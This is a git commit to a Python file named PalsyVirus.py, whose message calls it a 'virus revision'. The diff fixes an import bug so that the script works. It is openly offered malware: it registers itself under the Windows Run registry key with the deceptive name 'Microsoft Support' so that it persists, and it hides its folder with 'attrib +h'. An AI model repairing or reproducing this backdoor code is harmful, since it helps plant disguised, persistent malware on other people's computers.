2da80b56429b265c0d1d21b60ea0f6f8ceb12569
cybytess <87681509+cybytess@users.noreply.github.com>
2021-07-20 14:49:43 +0800

    Palsy virus revision
    there's mistake in the original version.
    line 9 : regConnect = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
    it should be regConnect = winreg.ConnectRegistry(None, HKEY_LOCAL_MACHINE)
    and should add : import winreg

--- PalsyVirus.py
+++ PalsyVirus.py
@@ -1,4 +1,4 @@
-import itertools,subprocess,sys,os
+import itertools,subprocess,sys,os,winreg
 f =  os.path.basename(sys.argv[0])
 Backdoor_Name=os.path.basename(__file__)
 hiddenPath = os.getcwd()
@@ -6,7 +6,7 @@ hiddenPath = '\"' + hiddenPath + '\"'
 regPath = os.getcwd()
 regPath = regPath + r"\%s"%Backdoor_Name
 regPath = '\"' + regPath + '\"'
-regConnect = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
+regConnect = winreg.ConnectRegistry(None, HKEY_LOCAL_MACHINE)
 regKey = OpenKey(regConnect, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
 SetValueEx(regKey,"Microsoft Support",0, REG_SZ, r"" + regPath)
 os.system("attrib +h " + hiddenPath)
